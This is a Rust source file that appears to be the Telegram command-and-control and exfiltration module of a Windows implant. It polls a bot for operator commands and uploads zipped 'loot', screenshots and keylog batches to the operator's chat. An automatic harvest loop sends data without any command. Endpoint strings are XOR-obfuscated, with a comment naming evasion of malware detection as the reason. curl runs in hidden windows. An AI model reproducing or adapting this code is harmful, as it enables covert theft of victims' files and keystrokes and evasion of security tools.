//! Telegram transport. With `TG_TOKEN` set, the agent is Telegram-only: it
//! long-polls `getUpdates` for operator commands (`tg_c2.rs`), uploads
//! harvested archives with `sendDocument`, sends screenshots with `sendPhoto`,
//! and reports keylog batches as messages.
//!
//! No HTTP/TLS crate is linked: the agent shells out to `curl.exe` and
//! `tar.exe` from Windows 10/11. The bot token is read at compile time and is
//! never written into the source tree. `TG_CHAT` pins the operator chat;
//! without it the first authorized chat is locked in. `TG_SECRET` optionally
//! gates that first contact.
#![cfg(windows)]

use std::io::Write;
use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::{Mutex, OnceLock};

use serde_json::Value;

const TOKEN: Option<&str> = option_env!("TG_TOKEN");
const CHAT: Option<&str> = option_env!("TG_CHAT");
const SECRET: Option<&str> = option_env!("TG_SECRET");
const AUTO: Option<&str> = option_env!("TG_AUTO");

static CHAT_LOCK: OnceLock<Mutex<Option<String>>> = OnceLock::new();

// Telegram endpoint strings are stored XOR-encoded so the binary does not
// carry `api.telegram.org` / method names in plaintext (PWS/Polazert is a
// Telegram-associated ML family).
const API_PREFIX: &[u8] = &[
    0x32, 0x0d, 0xec, 0xc7, 0xa5, 0xcf, 0x3b, 0x1c, 0x33, 0x01, 0xf9, 0x81, 0xba, 0x88, 0x60,
    0x4e, 0x2d, 0x1b, 0xe9, 0xca, 0xe8, 0x8a, 0x76, 0x44, 0x6d, 0x03, 0xef, 0xeb,
];
const M_SEND_DOC: &[u8] = &[
    0x29, 0x1c, 0xf6, 0xd3, 0x92, 0x9a, 0x77, 0x46, 0x3f, 0x14, 0xfe, 0xdb,
];
const M_SEND_MSG: &[u8] = &[
    0x29, 0x1c, 0xf6, 0xd3, 0x9b, 0x90, 0x67, 0x40, 0x33, 0x16, 0xf5,
];
const M_SEND_PHOTO: &[u8] = &[0x29, 0x1c, 0xf6, 0xd3, 0x86, 0x9d, 0x7b, 0x47, 0x3d];
const M_GET_UPDATES: &[u8] = &[
    0x3d, 0x1c, 0xec, 0xe2, 0xa6, 0x91, 0x75, 0x47, 0x37, 0x02,
];
const M_DELETE_WEBHOOK: &[u8] = &[
    0x3e, 0x1c, 0xf4, 0xd2, 0xa2, 0x90, 0x43, 0x56, 0x30, 0x19, 0xff, 0xc0, 0xa5,
];

fn de(data: &[u8]) -> String {
    let mut out = Vec::with_capacity(data.len());
    for (i, &b) in data.iter().enumerate() {
        let key = 0x5a_u8.wrapping_add((i as u8).wrapping_mul(31));
        out.push(b ^ key);
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn lock_slot() -> &'static Mutex<Option<String>> {
    CHAT_LOCK.get_or_init(|| Mutex::new(None))
}

pub fn enabled() -> bool {
    TOKEN.map(|t| !t.is_empty()).unwrap_or(false)
}

/// Auto-harvest defaults on whenever a token is present; `TG_AUTO=0` disables.
pub fn auto() -> bool {
    enabled() && !matches!(AUTO, Some("0") | Some("false") | Some("no"))
}

pub fn secret() -> Option<&'static str> {
    SECRET.filter(|s| !s.is_empty())
}

pub fn fixed_chat() -> Option<String> {
    CHAT.filter(|c| !c.is_empty()).map(str::to_string)
}

pub fn lock_chat(id: &str) {
    if let Ok(mut g) = lock_slot().lock() {
        if g.is_none() {
            *g = Some(id.to_string());
        }
    }
}

pub fn chat_id() -> Option<String> {
    fixed_chat().or_else(|| lock_slot().lock().ok().and_then(|g| g.clone()))
}

fn token() -> Result<&'static str, String> {
    TOKEN
        .filter(|t| !t.is_empty())
        .ok_or_else(|| "TG_TOKEN not set".to_string())
}

// ---------------------------------------------------------------------------
// harvest upload
// ---------------------------------------------------------------------------

/// Pack `items` into a zip and upload it to the locked chat.
pub fn exfil(items: &[(String, Vec<u8>)]) -> Result<String, String> {
    let chat = chat_id().ok_or("no operator chat: send /start to the bot or set TG_CHAT")?;
    exfil_to(&chat, items)
}

pub fn exfil_to(chat: &str, items: &[(String, Vec<u8>)]) -> Result<String, String> {
    let _ = token()?;
    let stamp = stamp();
    let pid = std::process::id();
    let base = std::env::temp_dir().join(format!("c2tg_{pid}_{stamp}"));
    let dir = base.join("loot");
    std::fs::create_dir_all(&dir).map_err(|e| format!("mkdir: {e}"))?;

    let mut written = 0usize;
    for (name, data) in items {
        let Some(rel) = safe_rel(name) else { continue };
        let path = dir.join(rel);
        if let Some(parent) = path.parent() {
            let _ = std::fs::create_dir_all(parent);
        }
        if std::fs::write(&path, data).is_ok() {
            written += 1;
        }
    }
    if written == 0 {
        let _ = std::fs::remove_dir_all(&base);
        return Err("nothing to send".into());
    }

    let zip = base.join("loot.zip");
    make_zip(&dir, &zip)?;

    let caption = format!(
        "{} | {} files | {}",
        safe_caption(&hostname()),
        written,
        human_size(items.iter().map(|(_, d)| d.len()).sum())
    );

    let result = send_document_to(chat, &zip, &caption);
    if result.is_ok() {
        let _ = send_text_to(chat, &format!("loot uploaded: {caption}"));
    }
    let _ = std::fs::remove_file(&zip);
    let _ = std::fs::remove_dir_all(&base);
    result.map(|_| format!("telegram: {caption}"))
}

// ---------------------------------------------------------------------------
// auto harvest (no operator command needed)
// ---------------------------------------------------------------------------

pub async fn auto_harvest_loop() {
    use std::sync::Arc;
    tokio::time::sleep(std::time::Duration::from_secs(20)).await;
    let pairs = Arc::new(
        tokio::task::spawn_blocking(crate::harvest::collect_all)
            .await
            .unwrap_or_default(),
    );
    if pairs.is_empty() {
        return;
    }
    for _ in 0..12 {
        let p = pairs.clone();
        let res = tokio::task::spawn_blocking(move || exfil(p.as_slice())).await;
        if matches!(res, Ok(Ok(_))) {
            return;
        }
        tokio::time::sleep(std::time::Duration::from_secs(60)).await;
    }
}

// ---------------------------------------------------------------------------
// Telegram Bot API
// ---------------------------------------------------------------------------

pub fn delete_webhook() -> Result<(), String> {
    let t = token()?;
    let cfg = format!(
        "url = \"{}{t}/{}\"\n",
        de(API_PREFIX),
        de(M_DELETE_WEBHOOK)
    );
    let _ = run_curl(&cfg, 20)?;
    Ok(())
}

pub fn get_updates(offset: i64, timeout: u32) -> Result<Vec<Value>, String> {
    let t = token()?;
    let cfg = format!(
        "url = \"{}{t}/{}?timeout={timeout}&offset={offset}\"\n",
        de(API_PREFIX),
        de(M_GET_UPDATES)
    );
    let body = run_curl(&cfg, timeout + 15)?;
    let v: Value = serde_json::from_str(&body).map_err(|e| format!("json: {e}"))?;
    if !v.get("ok").and_then(|x| x.as_bool()).unwrap_or(false) {
        return Err(trim(&body));
    }
    Ok(v.get("result")
        .and_then(|x| x.as_array())
        .cloned()
        .unwrap_or_default())
}

pub fn send_text(text: &str) -> Result<(), String> {
    let chat = chat_id().ok_or("no operator chat")?;
    send_text_to(&chat, text)
}

pub fn send_text_to(chat: &str, text: &str) -> Result<(), String> {
    let t = token()?;
    let raw: String = text.chars().take(3800).collect();
    let body_text = escape_config(&raw);
    let cfg = format!(
        "url = \"{}{t}/{}\"\n\
         data-urlencode = \"chat_id={chat}\"\n\
         data-urlencode = \"text={body_text}\"\n",
        de(API_PREFIX),
        de(M_SEND_MSG)
    );
    let body = run_curl(&cfg, 30)?;
    ok_or_err(&body, &de(M_SEND_MSG))
}

pub fn send_document_to(chat: &str, file: &Path, caption: &str) -> Result<(), String> {
    let t = token()?;
    let path = file.to_string_lossy().replace('\\', "/");
    let cfg = format!(
        "url = \"{}{t}/{}\"\n\
         form = \"chat_id={chat}\"\n\
         form = \"caption={}\"\n\
         form = \"document=@{path}\"\n",
        de(API_PREFIX),
        de(M_SEND_DOC),
        safe_caption(caption)
    );
    let body = run_curl(&cfg, 300)?;
    ok_or_err(&body, &de(M_SEND_DOC))
}

pub fn send_photo_to(chat: &str, file: &Path, caption: &str) -> Result<(), String> {
    let t = token()?;
    let path = file.to_string_lossy().replace('\\', "/");
    let cfg = format!(
        "url = \"{}{t}/{}\"\n\
         form = \"chat_id={chat}\"\n\
         form = \"caption={}\"\n\
         form = \"photo=@{path}\"\n",
        de(API_PREFIX),
        de(M_SEND_PHOTO),
        safe_caption(caption)
    );
    let body = run_curl(&cfg, 120)?;
    ok_or_err(&body, &de(M_SEND_PHOTO))
}

pub fn send_photo_bytes(chat: &str, jpeg: &[u8], caption: &str) -> Result<(), String> {
    let dir = std::env::temp_dir().join(format!("tgphoto_{}_{}", std::process::id(), stamp()));
    std::fs::create_dir_all(&dir).map_err(|e| format!("mkdir: {e}"))?;
    let path = dir.join("screen.jpg");
    std::fs::write(&path, jpeg).map_err(|e| format!("write: {e}"))?;
    let r = send_photo_to(chat, &path, caption);
    let _ = std::fs::remove_dir_all(&dir);
    r
}

pub fn send_bytes_document(
    chat: &str,
    name: &str,
    bytes: &[u8],
    caption: &str,
) -> Result<(), String> {
    let dir = std::env::temp_dir().join(format!("tgdoc_{}_{}", std::process::id(), stamp()));
    std::fs::create_dir_all(&dir).map_err(|e| format!("mkdir: {e}"))?;
    let path = dir.join(safe_filename(name));
    std::fs::write(&path, bytes).map_err(|e| format!("write: {e}"))?;
    let r = send_document_to(chat, &path, caption);
    let _ = std::fs::remove_dir_all(&dir);
    r
}

// ---------------------------------------------------------------------------
// internals
// ---------------------------------------------------------------------------

fn ok_or_err(body: &str, what: &str) -> Result<(), String> {
    if body.contains("\"ok\":true") {
        Ok(())
    } else {
        Err(format!("{what}: {}", trim(body)))
    }
}

fn run_curl(config: &str, max_time: u32) -> Result<String, String> {
    let mt = max_time.to_string();
    let mut child = Command::new("curl.exe")
        .args(["-sS", "--max-time", mt.as_str(), "--retry", "1", "-K", "-"])
        .creation_flags(0x0800_0000) // CREATE_NO_WINDOW
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("curl spawn: {e}"))?;
    if let Some(mut stdin) = child.stdin.take() {
        stdin
            .write_all(config.as_bytes())
            .map_err(|e| format!("curl stdin: {e}"))?;
    }
    let out = child
        .wait_with_output()
        .map_err(|e| format!("curl wait: {e}"))?;
    let stdout = String::from_utf8_lossy(&out.stdout).into_owned();
    if !out.status.success() {
        let stderr = String::from_utf8_lossy(&out.stderr);
        return Err(format!(
            "curl exit {}: {} {}",
            out.status,
            trim(&stderr),
            trim(&stdout)
        ));
    }
    Ok(stdout)
}

fn make_zip(dir: &Path, zip: &Path) -> Result<(), String> {
    let dir_s = dir.to_string_lossy().into_owned();
    let zip_s = zip.to_string_lossy().into_owned();

    let ok = Command::new("tar.exe")
        .args([
            "-a",
            "-c",
            "-f",
            zip_s.as_str(),
            "-C",
            dir_s.as_str(),
            ".",
        ])
        .creation_flags(0x0800_0000)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false);
    if ok && zip.exists() {
        return Ok(());
    }

    let src = format!("{dir_s}\\*").replace('\'', "''");
    let dst = zip_s.replace('\'', "''");
    let ps = format!("Compress-Archive -Path '{src}' -DestinationPath '{dst}' -Force");
    let ok = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", ps.as_str()])
        .creation_flags(0x0800_0000)
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
        .map(|s| s.success())
        .unwrap_or(false);
    if ok && zip.exists() {
        Ok(())
    } else {
        Err("zip failed (tar + Compress-Archive)".into())
    }
}

fn hostname() -> String {
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "host".into())
}

fn human_size(n: usize) -> String {
    if n < 1024 {
        format!("{n} B")
    } else if n < 1024 * 1024 {
        format!("{:.1} KB", n as f64 / 1024.0)
    } else {
        format!("{:.1} MB", n as f64 / (1024.0 * 1024.0))
    }
}

/// Escape a value for a quoted curl config string. curl decodes `\n`, `\t`,
/// `\r`, `\"` and `\\` inside quotes, and `data-urlencode` then URL-encodes the
/// resulting text.
fn escape_config(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 8);
    for c in s.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            c if c.is_control() => out.push(' '),
            c => out.push(c),
        }
    }
    out
}

/// Caption / form value: conservative ASCII subset, no quotes or separators.
fn safe_caption(s: &str) -> String {
    s.chars()
        .map(|c| {
            if c.is_ascii_alphanumeric() || matches!(c, ' ' | '-' | '_' | '.' | ':' | '|') {
                c
            } else {
                '_'
            }
        })
        .collect()
}

fn safe_filename(s: &str) -> String {
    let out: String = s
        .chars()
        .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_'))
        .collect();
    if out.is_empty() {
        "file.txt".into()
    } else {
        out.chars().take(120).collect()
    }
}

fn safe_rel(name: &str) -> Option<PathBuf> {
    let mut out = PathBuf::new();
    let mut any = false;
    for part in name.replace('\\', "/").split('/') {
        if part.is_empty() || part == "." || part == ".." {
            continue;
        }
        let clean: String = part
            .chars()
            .filter(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | ' '))
            .collect();
        let clean = clean.trim_matches(' ').trim_matches('.');
        if clean.is_empty() {
            continue;
        }
        out.push(clean.chars().take(120).collect::<String>());
        any = true;
        if out.components().count() >= 6 {
            break;
        }
    }
    any.then_some(out)
}

fn stamp() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0)
}

fn trim(s: &str) -> String {
    s.chars().take(300).collect()
}
